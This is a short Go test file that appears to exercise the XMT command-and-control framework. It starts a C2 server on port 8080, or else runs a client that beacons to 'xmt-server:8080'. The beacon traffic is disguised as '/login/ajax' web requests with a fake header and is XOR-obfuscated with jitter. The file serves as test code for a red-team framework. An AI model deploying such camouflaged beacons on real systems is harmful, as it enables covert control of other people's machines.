package main

import (
	"context"
	"os"
	"time"

	"github.com/PurpleSec/logx"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/wrapper"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/com/wc2"
	"github.com/iDigitalFlame/xmt/util/text"
)

func testWC2() {
	limits.MemorySweep(context.Background())

	if len(os.Args) == 2 {
		var (
			s = c2.NewServer(logx.Console(logx.Debug))
			x = wc2.New(time.Second * 10)
		)
		x.Target.URL = text.Matcher("/login/ajax/%s/%d")
		x.Target.Header("X-Watch", text.Matcher("%5fs-%5fs"))
		x.ServeDirectory("/", "/tmp")
		x.TargetAsRule()

		v := c2.Static{
			L: x,
			J: 30,
			S: time.Second * 5,
			H: "0.0.0.0:8080",
			W: wrapper.NewXOR([]byte("this is my special XOR key")),
		}

		l, err := s.Listen("http1", "", v)
		if err != nil {
			panic(err)
		}

		l.Wait()
		return
	}

	x := wc2.NewClient(0, &wc2.Target{URL: text.Matcher("/login/ajax/%s/%d")})
	x.Target.Header("X-Watch", text.Matcher("%5fs-%5fs"))

	v := c2.Static{
		C: x,
		J: 30,
		S: time.Second * 5,
		H: "xmt-server:8080",
		W: wrapper.NewXOR([]byte("this is my special XOR key")),
	}

	s, err := c2.Connect(logx.Console(logx.Debug), v)
	if err != nil {
		panic(err)
	}

	s.Wait()
}
